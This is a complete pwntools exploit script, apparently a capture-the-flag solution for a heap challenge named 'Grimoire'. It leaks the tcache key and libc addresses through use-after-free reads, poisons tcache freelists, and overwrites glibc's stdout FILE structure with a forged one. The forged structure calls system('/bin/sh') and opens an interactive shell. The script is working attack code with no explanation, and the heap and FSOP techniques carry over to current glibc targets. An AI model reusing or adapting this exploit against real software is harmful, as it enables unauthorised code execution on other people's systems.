#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
# tbreak main
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper



def add_spell(slot, name=b'testicular torsion', effect= b'...', mana=69, cooldown=2137, element=3):
    io.sendlineafter(b'Choice: ', b'1')
    io.sendlineafter(b'31): ', str(slot).encode())
    io.sendafter(b'name: ', name)
    io.sendafter(b'effect: ', effect)
    io.sendlineafter(b'cost: ', str(mana).encode())
    io.sendlineafter(b'seconds): ', str(cooldown).encode())
    io.sendlineafter(b'Choice: ', str(element).encode())


def edit_spell(slot, name=b'testicular torsion', effect= b'...', mana=69, cooldown=2137, element=3):
    io.sendlineafter(b'Choice: ', b'2')
    io.sendlineafter(b'31): ', str(slot).encode())
    io.sendafter(b'name: ', name)
    io.sendafter(b'effect: ', effect)
    io.sendlineafter(b'cost: ', str(mana).encode())
    io.sendlineafter(b'seconds): ', str(cooldown).encode())
    io.sendlineafter(b'Choice: ', str(element).encode())


def view_spells():
    io.sendlineafter(b'Choice: ', b'3')
    resp = io.recvuntil(b'=== Grimoire Menu ===', drop=True)
    parts = resp.split(b'Name: ')[1:]
    return [p.split(b'\n', 1)[0] for p in parts]


def delete_spell(slot):
    io.sendlineafter(b'Choice: ', b'4')
    io.sendlineafter(b'31): ', str(slot).encode())

@trace
def feedback(content, ll=None):
    if ll is None:
        ll = len(content)
    io.sendlineafter(b'Choice: ', b'5')
    sla(b'feedback: ', f'{ll}'.encode())
    sla(b'feedback: ', content)



for i in range(30):
    log.info(f'Adding {i}...')
    add_spell(i, element=0x81)

for i in range(11):
    log.info(f'Deleting {i}...')
    delete_spell(i)

fd_pointers = [u64(name.ljust(8, b'\x00')) for name in view_spells()[:11]]
tcache_key = fd_pointers[0]
log.info(f'{tcache_key = :016x}')

victim_addr = fd_pointers[8] ^ tcache_key
log.info(f'{victim_addr = :016x}')
edit_spell(10, name=p64((victim_addr - 16) ^ tcache_key))

add_spell(31)
add_spell(30, name=p64(0) + p64(0x801))

delete_spell(7)

libc_leak = u64(view_spells()[7].ljust(8, b'\x00'))
log.info(f'{libc_leak = :016x}')

libc = ELF('./libc.so.6')

libc.address = libc_leak - (0x00007f43ca603b20 - 0x7f43ca400000)
log.info(f'{libc.address = :016x}')

safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
heap_base = victim_addr - 0x610
delete_spell(31)
edit_spell(31, name=p64(tcache_key))

add_spell(31)

# ===

delete_spell(11)
delete_spell(12)
delete_spell(13)

victim_addr = u64(view_spells()[12].ljust(8, b'\x00')) ^ tcache_key
log.info(f'{victim_addr = :016x}')
edit_spell(13, name=p64((victim_addr - 16) ^ tcache_key))


add_spell(0)
edit_spell(10, effect=b'\x00' * 0x40, mana=0x00, cooldown=0x00, element=0x81)
add_spell(1, name=p64(0) + p64(0x111))


edit_spell(30, name=p64(0) + p64(0x111))

delete_spell(7)
delete_spell(11)
edit_spell(11, name=p64(libc.sym['_IO_2_1_stdout_'] ^ tcache_key))

feedback(b'foobar', ll=0x100)


stdout_lock = libc.sym['_IO_stdfile_1_lock']   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x001791f7 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)


feedback(bytes(fake), ll=0x100)


ia()
